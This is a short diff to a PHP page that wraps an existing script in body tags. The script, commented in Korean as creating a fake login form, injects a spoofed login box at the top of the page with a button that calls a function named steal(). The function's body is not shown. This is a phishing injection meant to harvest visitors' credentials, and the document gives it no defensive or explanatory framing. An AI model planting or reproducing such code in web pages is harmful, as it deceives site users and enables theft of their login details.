@@ -1,6 +1,7 @@
 <?php
 
 ?>
+<body>
 <script>
     // 가짜 로그인 폼 생성
     document.body.innerHTML = `
@@ -10,3 +11,4 @@
     <button onclick="steal()">로그인</button>
     </div>` + document.body.innerHTML;
 </script>
+</body>
